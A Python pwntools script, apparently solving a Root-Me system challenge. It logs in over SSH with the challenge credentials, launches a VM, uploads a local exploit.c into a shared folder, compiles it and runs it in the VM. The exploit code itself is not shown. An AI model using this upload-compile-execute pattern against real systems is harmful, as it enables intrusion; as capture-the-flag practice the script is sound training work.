#!/usr/bin/env python3
from pwn import *
import re

HOST = 'challenge03.root-me.org'
PORT = 2223
USER = 'app-systeme-ch1'
PASS = 'app-systeme-ch1'
C_CODE_PATH = "./exploit.c"


def main():
    conn = ssh(host=HOST, port=PORT, user=USER, password=PASS, timeout=10)

    log.info("Launching ./run...")
    vm = conn.run('./run')

    log.info("Waiting for share path...")
    line = vm.recvregex(rb'A share will be available: host:[^\s]+', timeout=20)
    match = re.search(rb'host:([^\s]+)', line)
    if not match:
        log.error("Failed to determine share path")
    share_path = match.group(1).decode()
    log.info(f"Share path: {share_path}")

    # Write the exploit directly via SFTP -- no heredoc quoting needed
    with open(C_CODE_PATH, 'rb') as f:
        exploit_code = f.read()

    remote_c = f"{share_path}/exploit.c"
    remote_bin = f"{share_path}/exploit"

    conn.upload_data(exploit_code, remote_c)
    log.info("exploit.c written")

    log.info("Compiling...")
    compile_out = conn.system(f"gcc -m32 -static -o {remote_bin} {remote_c}").recvall(timeout=30)
    if b"error:" in compile_out.lower():
        log.error(f"Compilation failed:\n{compile_out.decode(errors='replace')}")

    log.info(conn.system(f"file {remote_bin}").recvall(timeout=5).decode())
    log.info(conn.system(f"ls -lh {remote_bin}").recvall(timeout=5).decode())
    conn.system(f"chmod 777 {remote_bin}").recvall(timeout=5)
    log.info("Compilation complete")

    log.info("Waiting for VM shell...")
    vm.recvuntil(b'$ ', timeout=20)

    log.info("Checking shared exploit...")
    vm.sendline(b"ls -lh /mnt/share/exploit")
    ls_output = vm.recvuntil(b'$ ', timeout=5)
    print(ls_output.decode(errors='replace').strip())

    if b"No such file" in ls_output or b"cannot access" in ls_output:
        log.error("/mnt/share/exploit not found")

    log.info("Executing exploit...")
    vm.sendline(b"/mnt/share/exploit 2>&1")
    output = vm.recvall(timeout=20)

    print()
    print("============== EXPLOIT OUTPUT ==============")
    print(output.decode(errors='replace'))
    print("=============================================")

    vm.close()
    conn.close()


if __name__ == '__main__':
    main()
